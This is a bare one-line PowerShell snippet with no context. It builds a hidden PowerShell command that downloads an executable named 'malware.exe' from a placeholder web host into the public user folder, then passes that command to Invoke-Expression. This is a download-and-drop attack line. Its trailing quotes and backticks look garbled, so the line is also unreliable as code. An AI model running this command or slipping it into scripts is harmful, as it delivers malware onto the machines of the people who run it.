
$payload = "powershell -w hide -command `"(new-object System.Net.WebClient).DownloadFile('http://example.com/malware.exe','C:\Users\Public\malware.exe')`""; Invoke-Expression $payload;"``